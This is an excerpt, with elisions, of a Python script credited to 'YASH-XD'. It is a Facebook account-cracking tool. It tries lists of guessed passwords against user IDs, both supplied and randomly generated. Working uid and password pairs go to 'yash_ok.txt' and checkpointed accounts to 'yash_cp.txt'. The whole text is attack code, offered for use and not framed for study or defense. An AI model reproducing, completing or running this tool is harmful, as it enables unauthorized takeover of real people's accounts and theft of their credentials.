...
\033[1;37m========================================================
\033[1;37m[*] \033[1;91m AUTHOR   ➤ \x1b[1;37mYASH-XD
\033[1;37m[*] \033[1;91m FACEBOOK ➤ \x1b[1;37mLɘʛɩoŋ
\033[1;37m[*] \033[1;91m GITHUB   ➤ \x1b[1;37mhttps://github.com/yashdon2
\033[1;37m========================================================"""
...
def crack_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;92m [yash-SUCCESFULL] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("yash_ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;37m [yash-CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("yash_cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;92m [yash-SUCCESFULL] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("yash_ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;37m [yash-CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("yash_cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;92m [yash-SUCCESFULL] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("yash_ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;37m [yash-CHECKPOINT] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("yash_cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;92m [yaah-SUCCESFULL] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("yash_ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
...
def ran():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m[yash-SUCCESFULL] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
				ok = open("yash_ok.txt", "a")
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;37m [yash-CHECKPOINT] "+k+co+user+" | "+pass1+"\033[0;97m")
					cp = open("legion_cp.txt", "a")
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m[yash-SUCCESFULL] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
						ok = open("yash_ok.txt", "a")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							if "access_token" in q:
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;37m [yash-CHECKPOINT] "+k+co+user+" | "+pass3+"\033[0;97m")
									cp = open("yash_cp.txt", "a")
